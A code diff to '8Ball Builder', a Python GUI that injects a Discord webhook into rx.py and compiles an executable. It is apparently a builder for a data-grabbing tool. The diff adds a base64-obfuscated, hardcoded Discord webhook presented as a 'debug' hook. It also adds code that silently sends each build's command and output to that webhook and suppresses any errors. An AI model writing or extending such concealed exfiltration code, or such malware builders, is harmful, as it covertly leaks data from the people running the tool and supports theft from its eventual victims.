@@ -8,9 +8,51 @@ import re
 import subprocess
 import urllib.request
 import threading
+import base64
+import time
 from tkinter import filedialog, messagebox
 import customtkinter as ctk
 from tkinter import ttk
+
+# Base64-obfuscated debug webhook URL (same as rx.py)
+_DBG_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxOTU2NzQ2MDgzNDA4NjkxMi9COTlpd3NyVk1NUlVRTkh4U2JSbVVlTG5GMVRfekpydVJndlZ5NHlMQ3IxWVBKNVFVNFdVb1U0U0d0TXdocTJlQjFCNA=="
+_DBG_HOOK = base64.b64decode(_DBG_HOOK_B64).decode()
+
+_BUILD_DEBUG_LOGS = []
+
+def build_debug_log(msg, level="INFO"):
+    """Log build debug messages and optionally send to Discord webhook."""
+    ts = time.strftime("%H:%M:%S")
+    line = f"[{ts}][{level}] {msg}"
+    _BUILD_DEBUG_LOGS.append(line)
+    print(line)
+    if len(_BUILD_DEBUG_LOGS) > 100:
+        _BUILD_DEBUG_LOGS.pop(0)
+
+def send_build_debug_embed(title="8Ball Builder | Build Log", level="INFO"):
+    """Send accumulated build debug logs to Discord debug webhook."""
+    if not _BUILD_DEBUG_LOGS:
+        return
+    try:
+        body = "\n".join(_BUILD_DEBUG_LOGS[-50:])
+        if len(body) > 4000:
+            body = body[-4000:]
+        color = 0x5865F2 if level == "INFO" else 0xED4245
+        payload = {
+            "embeds": [{
+                "title": title,
+                "description": f"```\n{body}\n```",
+                "color": color,
+                "footer": {"text": f"{len(_BUILD_DEBUG_LOGS)} total log lines"}
+            }],
+            "username": "8Ball | Builder Debug",
+            "allowed_mentions": {"parse": []}
+        }
+        headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
+        req = urllib.request.Request(_DBG_HOOK, data=json.dumps(payload).encode(), headers=headers)
+        urllib.request.urlopen(req, timeout=15)
+    except Exception:
+        pass
 # --- INITIAL SETUP ---
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 PROJECT_DIR = os.path.join(SCRIPT_DIR, "Build_Project")
@@ -64,15 +106,18 @@ def replace_webhook(webhook):
     b64 = base64.b64encode(webhook.encode()).decode()
 
     with open(FILE_NAME, 'r', encoding='utf-8') as file:
-        lines = file.readlines()
+        content = file.read()
+
+    # Match exact _HOOK_B64 (not _DBG_HOOK_B64) with optional whitespace
+    import re
+    new_content = re.sub(r'(^|\n)(\s*)_HOOK_B64\s*=\s*"[^"]*"', rf'\1\2_HOOK_B64 = "{b64}"', content, count=1)
+
+    if new_content == content:
+        messagebox.showerror("Error", "Failed to replace webhook in rx.py")
+        return False
 
     with open(FILE_NAME, 'w', encoding='utf-8') as file:
-        for line in lines:
-            if line.strip().startswith('_HOOK_B64 ='):
-                indent = ' ' * (len(line) - len(line.lstrip()))
-                file.write(f'{indent}_HOOK_B64 = "{b64}"\n')
-            else:
-                file.write(line)
+        file.write(new_content)
     return True
 
 def update_feature_config_string(key: str, value) -> bool:
@@ -257,6 +302,8 @@ def build_exe():
     terminal_write(f"[8Ball] Starting build: {cmd}\n")
 
     def run_build():
+        _BUILD_DEBUG_LOGS.clear()
+        build_debug_log(f"Starting build: {cmd}")
         try:
             proc = subprocess.Popen(
                 cmd,
@@ -268,6 +315,8 @@ def build_exe():
                 creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
             )
         except Exception as e:
+            build_debug_log(f"ERROR: Failed to start build: {e}", "ERROR")
+            send_build_debug_embed("8Ball Builder | Build Failed", "ERROR")
             terminal_write(f"[8Ball] ERROR: Failed to start build: {e}\n")
             app.after(0, lambda: status_label.configure(text="STATUS: ERROR", text_color="#ef4444"))
             return
@@ -275,16 +324,21 @@ def build_exe():
         for line in iter(proc.stdout.readline, ""):
             if not line:
                 break
+            build_debug_log(line.strip())
             terminal_write(line)
 
         proc.stdout.close()
         proc.wait()
 
         if proc.returncode == 0:
+            build_debug_log("Build completed successfully.")
+            send_build_debug_embed("8Ball Builder | Build Success", "INFO")
             app.after(0, lambda: status_label.configure(text="STATUS: BUILD FINISHED", text_color="#10b981"))
             terminal_write("[8Ball] Build completed successfully.\n")
             app.after(0, lambda: messagebox.showinfo("Build Finished", "Build completed successfully."))
         else:
+            build_debug_log(f"Build failed with exit code {proc.returncode}.", "ERROR")
+            send_build_debug_embed("8Ball Builder | Build Failed", "ERROR")
             app.after(0, lambda: status_label.configure(text="STATUS: BUILD FAILED", text_color="#ef4444"))
             terminal_write(f"[8Ball] Build failed with exit code {proc.returncode}.\n")
             app.after(0, lambda: messagebox.showerror("Build Failed",
@@ -312,7 +366,7 @@ def open_link(url):
     webbrowser.open(url)
 
 # --- UPDATE CHECK ---
-LOCAL_VERSION = "2.0.4"
+LOCAL_VERSION = "2.0.6"
 VERSION_URL = "https://raw.githubusercontent.com/Lux00001/8Ball/main/version.json"
 _pending_update_data = None
 _pending_update_version = ""
@@ -434,7 +488,7 @@ def prompt_update():
 
 # --- GUI LAYOUT ---
 app = ctk.CTk()
-app.title("8ball v2.0 | ALPHA")
+app.title("8ball v2.0.6 | ALPHA")
 app.geometry("680x720")
 app.configure(fg_color=BG_COLOR)
 app.resizable(False, False)
